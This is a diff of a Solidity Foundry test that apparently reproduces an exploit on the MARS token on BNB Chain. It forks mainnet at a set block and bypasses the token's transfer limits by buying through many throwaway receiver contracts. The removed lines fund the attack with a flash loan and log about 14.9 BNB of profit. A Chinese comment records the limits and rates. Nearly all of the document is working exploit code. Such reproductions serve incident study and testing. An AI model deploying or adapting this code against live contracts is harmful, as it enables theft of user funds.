@@ -18,30 +18,38 @@ IPancakeRouterV2 constant pancakeRouterV2 = IPancakeRouterV2(
     payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
 );
 
+/*  
+Mars 币 transfer 有限制
+
+买入 1 < < 2 bnb
+卖出 1000 个
+
+
+1 bnb -> 776
+2 bnb -> 1552
+...
+20 bnb -> 15430
+*/
+
 contract TokenReceiver {
     constructor() payable {
         MARS.approve(msg.sender, type(uint256).max);
     }
 }
 
-contract MarksHack {
-    address admin;
+contract MarksTest is Test {
+    function setUp() public {
+        vm.createSelectFork("bsc", 37_903_300 - 1);
 
-    constructor() payable {
-        admin = msg.sender;
+        deal(address(this), 0.1 ether);
+        deal(address(BNB), address(this), 50 ether);
     }
 
-    function exploit() public {
-        pairPool.flash(address(this), 0, 350 ether, hex"0000");
+    function getBalance(address token) public view returns (uint256) {
+        return IERC20(token).balanceOf(address(this));
     }
 
-    function pancakeV3FlashCallback(
-        uint256 /* fee0 */,
-        uint256 fee1,
-        bytes calldata /* data */
-    ) external {
-        require(msg.sender == address(pairPool), "not authorized");
-
+    function testExploit() public {
         BNB.approve(address(pancakeRouterV2), type(uint256).max - 1);
         MARS.approve(address(pancakeRouterV2), type(uint256).max - 1);
 
@@ -49,12 +57,14 @@ contract MarksHack {
         path[0] = address(BNB);
         path[1] = address(MARS);
 
-        for (uint i = 0; ; ) {
+        for (uint256 i = 0; ; ) {
             if (BNB.balanceOf(address(this)) == 0) {
                 break;
             }
-            uint tobuy = pancakeRouterV2.getAmountsIn(1000 ether, path)[0];
+
+            uint256 tobuy = pancakeRouterV2.getAmountsIn(1000 ether, path)[0];
             TokenReceiver receiver = new TokenReceiver();
+
             if (BNB.balanceOf(address(this)) > tobuy) {
                 pancakeRouterV2
                     .swapExactTokensForTokensSupportingFeeOnTransferTokens(
@@ -64,6 +74,7 @@ contract MarksHack {
                         address(receiver),
                         block.timestamp + 1
                     );
+
                 MARS.transferFrom(
                     address(receiver),
                     address(this),
@@ -116,25 +127,18 @@ contract MarksHack {
             }
         }
 
-        // repay the money
-        BNB.transfer(address(pairPool), 350 ether + fee1);
+        emit log_named_decimal_uint(
+            "WBNB Balance",
+            getBalance(address(BNB)),
+            18
+        );
 
-        console.log(BNB.balanceOf(address(this))); // 14_917_247_169_204_703_006
-        console.log(MARS.balanceOf(address(this))); // 0
+        emit log_named_decimal_uint(
+            "Mars Balance",
+            getBalance(address(MARS)),
+            18
+        );
     }
 
     receive() external payable {}
-}
-
-contract MarksTest is Test {
-    MarksHack hacker;
-
-    function setUp() public {
-        vm.createSelectFork("bsc", 37_903_300 - 1);
-    }
-
-    function testExploit() public {
-        hacker = new MarksHack{value: 12345}();
-        hacker.exploit();
-    }
 }
